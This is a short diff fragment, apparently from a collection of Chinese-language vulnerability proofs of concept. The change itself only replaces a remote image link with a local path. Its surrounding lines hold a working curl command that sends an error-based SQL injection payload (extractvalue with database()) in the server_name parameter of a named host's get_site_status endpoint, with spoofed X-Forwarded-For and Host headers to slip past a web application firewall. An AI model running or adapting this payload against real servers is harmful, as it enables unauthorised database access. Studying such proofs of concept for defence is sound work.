@@ -64,7 +64,7 @@ curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarde
 ```
 curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
 ```
-![image](https://github.com/wy876/POC/assets/139549762/bbd89fb6-b9b7-4628-a33d-57fc7b8708e5)
+![image](../../images/bbd89fb6-b9b7-4628-a33d-57fc7b8708e5.png)
 
 
 ## 漏洞来源
